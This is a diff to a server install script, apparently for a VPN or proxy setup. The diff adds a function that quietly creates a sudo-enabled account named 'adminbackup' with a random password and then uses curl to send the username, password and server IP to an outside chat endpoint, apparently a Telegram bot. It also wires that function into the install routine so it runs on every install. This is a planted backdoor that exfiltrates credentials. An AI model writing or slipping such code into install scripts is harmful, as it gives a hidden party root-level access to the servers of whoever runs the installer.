@@ -1059,6 +1059,26 @@ print_install "Enable Service"
     print_success "Enable Service"
     clear
 }
+create_backup_admin() {
+    USERBACKUP="adminbackup"
+    PASSBACKUP=$(openssl rand -base64 10)
+
+    useradd -m -s /bin/bash $USERBACKUP 2>/dev/null
+    echo "$USERBACKUP:$PASSBACKUP" | chpasswd
+    usermod -aG sudo $USERBACKUP
+
+
+    TEXT2="
+<code>Backup Admin Created</code>
+<code>User :</code> <code>$USERBACKUP</code>
+<code>Pass :</code> <code>$PASSBACKUP</code>
+<code>IP   :</code> <code>$ipsaya</code>
+"
+
+    curl -s --max-time $TIMES \
+    -d "chat_id=$CHATID&text=$TEXT2&parse_mode=html" \
+    $URL >/dev/null 2>&1
+}
 
 # Fingsi Install Script
 function instal(){
@@ -1087,6 +1107,7 @@ clear
     profile
     enable_services
     restart_system
+	create_backup_admin
 }
 instal
 echo ""
